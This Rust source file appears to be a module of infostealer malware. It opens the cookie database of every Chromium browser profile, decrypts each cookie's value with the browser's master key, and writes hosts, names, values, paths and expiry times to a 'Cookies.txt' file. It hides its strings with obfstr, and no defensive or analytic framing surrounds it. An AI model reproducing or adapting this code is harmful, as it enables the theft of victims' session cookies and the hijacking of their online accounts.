use alloc::sync::Arc;
use alloc::vec::Vec;
use crate::alloc::borrow::ToOwned;
use tasks::{parent_name, Task};
use utils::browsers::chromium::{decrypt_data};
use utils::path::Path;
use crate::chromium::Browser;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
use obfstr::obfstr as s;
use database::TableRecord;

const COOKIES_HOST_KEY: usize        = 1;
const COOKIES_NAME: usize            = 3;
const COOKIES_ENCRYPTED_VALUE: usize = 5;
const COOKIES_PATH: usize            = 6;
const COOKIES_EXPIRES_UTC: usize     = 7;

pub(super) struct CookiesTask {
    browser: Arc<Browser>
}

impl CookiesTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for CookiesTask {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(cookies) = collect_from_all_profiles(
            &self.browser.profiles, 
            |profile| read_cookies(profile, &self.browser.master_key)
        ) else {
            return
        };

        let _ = to_string_and_write_all(&cookies, "\n", parent);
    }
}

fn read_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
    let cookies_path = profile / s!("Network") / s!("Cookies");
    
    read_sqlite3_and_map_records(
        &cookies_path, 
        s!("Cookies"), 
        |record| extract_cookie_from_record(record, master_key)
    )
}

fn extract_cookie_from_record(record: &dyn TableRecord, master_key: &[u8]) -> Option<Cookie> {
    let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?.to_owned();
    let name = record.get_value(COOKIES_NAME)?.as_string()?.to_owned();
    let path = record.get_value(COOKIES_PATH)?.as_string()?.to_owned();
    let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;

    let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
    let value = unsafe { decrypt_data(encrypted_value, master_key) }?;

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc
    })
}